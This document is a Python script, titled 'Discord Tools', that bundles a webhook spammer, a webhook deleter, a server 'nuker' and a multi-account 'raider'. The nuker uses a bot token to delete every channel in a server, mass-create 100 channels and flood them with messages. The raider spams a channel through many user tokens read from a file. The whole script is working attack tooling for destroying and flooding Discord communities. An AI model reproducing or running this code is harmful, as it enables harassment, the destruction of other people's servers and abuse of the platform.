import requests
import time
import keyboard
import os
from colorama import Fore, Style, init
import threading
import concurrent.futures
import sys

os.system("title Discord Tools")

init(autoreset=True)

def clear_console():
    os.system('cls' if sys.platform.startswith('win') else 'clear')

def gradient_text(text):
    result = ""
    for i, char in enumerate(text):
        ratio = i / (len(text) - 1) if len(text) > 1 else 0
        r = int(0 + (0 - 0) * ratio)  # Красный остается 0
        g = int(0 + (255 - 0) * ratio)  # Зеленый плавно увеличивается
        b = int(255 + (255 - 255) * ratio)  # Синий остается 255
        
        result += f"\033[38;2;{r};{g};{b}m{char}"
    
    return result + Style.RESET_ALL

BANNER = gradient_text("""
            ::::::::: ::::::::::: ::::::::     ::::::::::: ::::::::   ::::::::  :::        ::::::::
            :+:    :+:    :+:    :+:    :+:        :+:    :+:    :+: :+:    :+: :+:       :+:    :+:
            +:+    +:+    +:+    +:+               +:+    +:+    +:+ +:+    +:+ +:+       +:+        
            +#+    +:+    +#+    +#++:++#++        +#+    +#+    +:+ +#+    +:+ +#+       +#++:++#++  
            +#+    +#+    +#+           +#+        +#+    +#+    +#+ +#+    +#+ +#+              +#+   
            #+#    #+#    #+#    #+#    #+#        #+#    #+#    #+# #+#    #+# #+#       #+#    #+#    
            ######### ########### ########   #     ###     ########   ########  ########## ########      
""")

def send_request(webhook_url, message):
    try:
        response = requests.post(webhook_url, json={"content": message})
        if response.status_code == 204:
            print(f"{Fore.CYAN}Sent!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Error send: {response.status_code}, {response.text}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Exception: {e}{Style.RESET_ALL}")

def discord_spammer():

    server_id = input("Server ID: ")
    channel_id = input("Channel ID: ")
    message = input("Message: ")
    delay = float(input("Delay (seconds): "))

    try:
        with open("accounts.txt", "r") as f:
            tokens = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print("{Fore.RED}[-]file accounts.txt not found!")
        return

    if not tokens:
        print("{Fore.RED}[-]No any tokens")
        return

    print(f"Using {len(tokens)} Accounts.")

    headers_template = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    try:
        while True:
            for token in tokens:
                headers = headers_template.copy()
                headers["Authorization"] = token

                url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
                data = {"content": message}

                response = requests.post(url, json=data, headers=headers)

                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+]Send! {token[:10]}...")
                else:
                    print(f"{Fore.RED}[-]Error! ({response.status_code}) with send {token[:10]}: {response.text}")

                time.sleep(delay)
    except KeyboardInterrupt:
        print("\nSpam Stopped")

def spam_webhook():
    print("\nSelect:")
    print("[1] - Single Webhook URL")
    print("[2] - Database File (database.txt)\n")
    
    mode = input("Select mode: ").strip()
    
    if mode == "1":
        webhook_urls = [input("Url webhook: ")]
    elif mode == "2":
        try:
            with open("database.txt", "r") as file:
                webhook_urls = [line.strip() for line in file if line.strip()]
            print(f"{Fore.GREEN}Loaded {len(webhook_urls)} webhooks from database.txt{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}database.txt not found!{Style.RESET_ALL}")
            return
    else:
        print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
        return
    
    message = input("Message for spam: ")
    threads = int(input("Threads: "))
    delay = float(input("Delay (seconds, e.g. 0.001 for 1ms): "))
    
    print(f"{Fore.GREEN}Press ESC to stop.{Style.RESET_ALL}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            if keyboard.is_pressed("esc"):
                print(f"{Fore.YELLOW}Stopped...{Style.RESET_ALL}")
                break
            for webhook_url in webhook_urls:
                executor.submit(send_request, webhook_url, message)
            time.sleep(delay)

def delete_webhook():
    webhook_url = input("Url webhook: ")
    confirm = input(f"{Fore.YELLOW}u sure want del? (y/n): {Style.RESET_ALL}").strip().lower()

    if confirm == "y":
        response = requests.delete(webhook_url)
        if response.status_code == 204:
            print(f"{Fore.GREEN}deleted!{Style.RESET_ALL}")
            main()
        else:
            print(f"{Fore.RED}Error delete webhook: {response.status_code}, {response.text}{Style.RESET_ALL}")
            main()
    else:
        print(f"{Fore.BLUE}Stopped.{Style.RESET_ALL}")
        main()


def delete_channels_fast(bot_token, guild_id):
    headers = {"Authorization": f"Bot {bot_token}"}
    channels_url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    
    response = requests.get(channels_url, headers=headers)
    if response.status_code != 200:
        print(f"{Fore.RED}[-]Error fetching channels: {response.status_code}, {response.text}{Style.RESET_ALL}")
        return []
    
    channels = response.json()
    threads = []
    for channel in channels:
        t = threading.Thread(target=requests.delete, args=(f"https://discord.com/api/v10/channels/{channel['id']}",), kwargs={"headers": headers})
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    print(f"{Fore.CYAN}[+]All channels deleted quickly!{Style.RESET_ALL}")

def create_channel(bot_token, guild_id, channel_name):
    headers = {"Authorization": f"Bot {bot_token}"}
    channels_url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    
    new_channel_data = {"name": channel_name, "type": 0}
    response = requests.post(channels_url, headers=headers, json=new_channel_data)
    if response.status_code == 201:
        print(f"{Fore.GREEN}[+]Created channel: {channel_name}{Style.RESET_ALL}")
        return response.json()["id"]
    else:
        print(f"{Fore.RED}[-]Error creating channel: {response.status_code}, {response.text}{Style.RESET_ALL}")
        return None

def create_channels_fast(bot_token, guild_id, channel_name, count):
    channel_ids = []
    threads = []
    
    def create():
        channel_id = create_channel(bot_token, guild_id, channel_name)
        if channel_id:
            channel_ids.append(channel_id)
    
    for _ in range(count):
        thread = threading.Thread(target=create)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return channel_ids

def get_webhook_info():
    webhook_url = input("Enter Webhook URL: ")
    response = requests.get(webhook_url)
    
    if response.status_code == 200:
        data = response.json()
        name = data.get("name", "Unknown")
        avatar = data.get("avatar", "None")
        channel_id = data.get("channel_id", "Unknown")
        guild_id = data.get("guild_id", "Unknown")
        print(f"{Fore.GREEN}[+] Webhook Name: {name}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Avatar: {avatar}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Channel ID: {channel_id}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Guild ID: {guild_id}{Style.RESET_ALL}")
        main()
    else:
        print(f"{Fore.RED}[-] Failed to fetch webhook info: {response.status_code} {response.text}{Style.RESET_ALL}")
        main()

def bot_spammer():
    bot_token = input("Enter bot token: ")
    guild_id = input("Enter Guild (Server) ID: ")
    message = input("Message for spam: ")
    delay = int(input("Delay (ms): ")) / 1000
    channel_name = input("Enter spam channel name: ")
    
    delete_channels_fast(bot_token, guild_id)
    
    print(f"{Fore.YELLOW}[=]Creating 100 channels quickly...{Style.RESET_ALL}")
    channel_ids = create_channels_fast(bot_token, guild_id, channel_name, 100)
    
    if not channel_ids:
        print(f"{Fore.RED}[-]No channels were created, stopping...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}[+]Spamming started in 100 channels in batches of 50! Press ESC to stop.{Style.RESET_ALL}")
    
    batch_size = 50
    
    while True:
        if keyboard.is_pressed("esc"):
            print(f"{Fore.YELLOW}[=]Stopped...{Style.RESET_ALL}")
            return
        
        for i in range(0, len(channel_ids), batch_size):
            batch = channel_ids[i:i + batch_size]
            threads = []
            
            def send_message(channel_id):
                send_url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
                response = requests.post(send_url, headers={"Authorization": f"Bot {bot_token}"}, json={"content": message})
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+]Sent to {channel_id}!{Style.RESET_ALL}")
                elif response.status_code == 404:
                    print(f"{Fore.YELLOW}[=]Channel deleted, recreating...{Style.RESET_ALL}")
                    new_channel_id = create_channel(bot_token, guild_id, channel_name)
                    if new_channel_id:
                        channel_ids[channel_ids.index(channel_id)] = new_channel_id
                else:
                    print(f"{Fore.RED}[-]Error {response.status_code}: {response.text}{Style.RESET_ALL}")
            
            for channel_id in batch:
                thread = threading.Thread(target=send_message, args=(channel_id,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            time.sleep(delay)


def main():
    print(BANNER)
    print("                                       ")
    print("                                               Select:             ")
    print("                                       [1] - Spam webhook   ")
    print("                                       [2] - Delete webhook ")
    print("                                       [3] - Nuker          ")
    print("                                       [4] - Webhook info")
    print("                                       [5] - Raider")
    print("                                       ")
    
    choice = input("Write number: ").strip()
    
    if choice == "1":
        spam_webhook()
    elif choice == "2":
        delete_webhook()
    elif choice == "3":
        bot_spammer()
    elif choice == "4":
        get_webhook_info()
    elif choice == "5":
        discord_spammer()
    else:
        print(f"{Fore.RED}[-]Wrong number, try again!{Style.RESET_ALL}")
        time.sleep(2)
        clear_console()
        main()

if __name__ == "__main__":
    main()
